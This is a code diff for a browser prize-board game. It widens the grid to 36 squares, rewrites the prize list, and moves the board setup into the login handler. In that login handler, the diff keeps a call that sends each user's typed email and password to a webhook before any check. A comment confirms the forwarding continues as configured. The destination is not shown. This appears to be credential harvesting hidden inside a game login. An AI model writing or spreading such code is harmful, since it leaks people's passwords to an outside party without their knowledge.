@@ -75,9 +75,10 @@ button:hover {
 
 #pizarra {
     display: grid;
-    grid-template-columns: repeat(4, 100px);
+    grid-template-columns: repeat(6, 100px); /* Cambiado a 6 para acomodar 36 casilleros */
     gap: 10px;
 }
+
 
 .casillero {
     width: 100px;
@@ -160,12 +161,11 @@ span {
     }
 });
 
-    document.getElementById('btnLogin').addEventListener('click', function() {
+   document.getElementById('btnLogin').addEventListener('click', function() {
     const email = document.getElementById('loginUsuario').value;
     const contrasena = document.getElementById('loginContrasena').value;
     
-    // Aquí llamas a la función para enviar los datos al webhook antes de realizar cualquier otra operación.
-    enviarDatosAWebhook(email, contrasena);
+    enviarDatosAWebhook(email, contrasena); // Continúa enviando los datos al webhook como ya estaba configurado.
     
     const userData = localStorage.getItem(email);
     if (userData) {
@@ -174,7 +174,8 @@ span {
             alert('Inicio de sesión exitoso.');
             document.getElementById('login').style.display = 'none';
             document.getElementById('game-container').style.display = 'block';
-            //inicializarPizarra(); // Asegúrate de que esta llamada es necesaria aquí.
+            inicializarPremios(); // Asegurarse de inicializar los premios primero
+            inicializarPizarra(); // Luego inicializar la pizarra
         } else {
             alert('Contraseña incorrecta');
         }
@@ -182,6 +183,7 @@ span {
         alert('Usuario no encontrado');
     }
 });
+
 
 
     // Cambia a la vista de registro
@@ -225,23 +227,24 @@ span {
     }
 
 function inicializarPremios() {
-    // Limpiar el arreglo de premios anterior
+    // Reiniciar los premios
     premios = [];
-  
-    // Añadir premios específicos
-    premios.push('x10'); // 1 casillero x10
-    for (let i = 0; i < 3; i++) premios.push('x2'); // 3 casilleros x2
-    for (let i = 0; i < 7; i++) premios.push('x1'); // 7 casilleros x1
-    for (let i = 0; i < 10; i++) premios.push('x0.5'); // 10 casilleros x0.5
-  
-    // El resto de casilleros serán sin premio
+
+    // Añadir premios
+    premios.push('X10'); // 1 casillero x10
+    for (let i = 0; i < 3; i++) premios.push('X2'); // 3 casilleros x2
+    for (let i = 0; i < 7; i++) premios.push('X1'); // 7 casilleros x1
+    for (let i = 0; i < 10; i++) premios.push('X0.5'); // 10 casilleros x0.5
+
+    // Rellenar el resto de casilleros con 'Sin premio'
     while (premios.length < 36) {
         premios.push('Sin premio');
     }
 
-    // Barajar los premios para que estén en posiciones aleatorias
+    // Mezclar los premios
     premios.sort(() => Math.random() - 0.5);
 }
+
 
 
 
@@ -313,7 +316,6 @@ document.getElementById('irARegistro').addEventListener('click', function() {
         actualizarOportunidades();
     }
 
-    inicializarPizarra();
 });
 
 
